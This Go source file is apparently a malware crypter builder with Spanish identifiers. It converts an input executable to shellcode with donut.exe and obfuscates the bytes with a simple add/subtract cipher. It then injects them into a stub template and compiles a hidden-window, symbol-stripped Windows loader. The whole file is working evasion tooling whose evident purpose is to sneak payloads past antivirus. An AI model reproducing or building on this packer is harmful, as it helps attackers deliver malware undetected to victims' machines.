package main

import (
	"bytes"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

func encriptar(b []byte) []byte {
	n := 0
	for i := 0; i < len(b); i++ {
		if n == 0 {
			b[i] += 10
			n = 1
		} else {
			b[i] -= 11
			n = 0
		}
	}
	return b
}

func main() {
	if len(os.Args) == 1 {
		color.Red("Ingresa los argumentos")
		os.Exit(1)
	}

	Archivo := os.Args[1]
	shellcode := Donut(Archivo)

	shellcodeEncriptado := encriptar(shellcode)
	Encriptstr := ConvertToString(shellcodeEncriptado)

	stub, err := os.ReadFile("stub.txt")
	if err != nil {
		panic(err)
	}

	stub = bytes.Replace(stub, []byte("#Reemplazar"), []byte(Encriptstr), 1)

	err = os.WriteFile("stub.go", stub, 0644)
	if err != nil {
		panic(err)
	}

	salida, err := exec.Command("powershell", "-c", `go build -ldflags="-H=windowsgui -s -w" stub.go`).CombinedOutput()
	if err != nil {
		panic(string(salida))
	}

	err = os.Remove("stub.go")
	if err != nil {
		panic(err)
	}

	color.Blue("Encriptacion completada exitosamente")
}

func ConvertToString(b []byte) string {
	s := make([]string, len(b))
	for i := range b {
		s[i] = strconv.Itoa(int(b[i]))
	}
	return strings.Join(s, ",")
}

func Donut(archivo string) []byte {
	directorio, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	salida, err := exec.Command(directorio+"\\donut.exe", "-i", archivo).CombinedOutput()
	if err != nil {
		panic(string(salida))
	}

	shellcode, err := os.ReadFile("loader.bin")
	if err != nil {
		panic(err)
	}

	err = os.Remove("loader.bin")
	if err != nil {
		panic(err)
	}

	return shellcode
}
